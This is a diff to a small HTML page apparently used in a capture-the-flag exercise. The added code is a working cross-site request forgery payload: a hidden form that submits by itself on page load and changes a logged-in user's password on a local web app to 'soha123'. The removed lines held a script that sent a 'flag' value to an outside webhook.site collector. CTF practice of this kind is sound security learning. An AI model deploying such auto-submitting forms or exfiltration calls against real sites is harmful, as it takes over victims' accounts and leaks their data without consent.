@@ -1,12 +1,14 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <title>ctf</title>
-</head>
 <body>
-    <script>
-       fetch("https://webhook.site/ccab645c-3998-49d8-a909-de99cbec5011/flag=haha")
-    </script>
+  <form id="csrfForm" action="http://localhost:3000/rest/user/change-password" method="GET">
+    <input type="hidden" name="new" value="soha123" />
+    <input type="hidden" name="repeat" value="soha123" />
+  </form>
+  <script>
+    document.getElementById('csrfForm').submit();
+  </script>
 </body>
 </html>
+
+
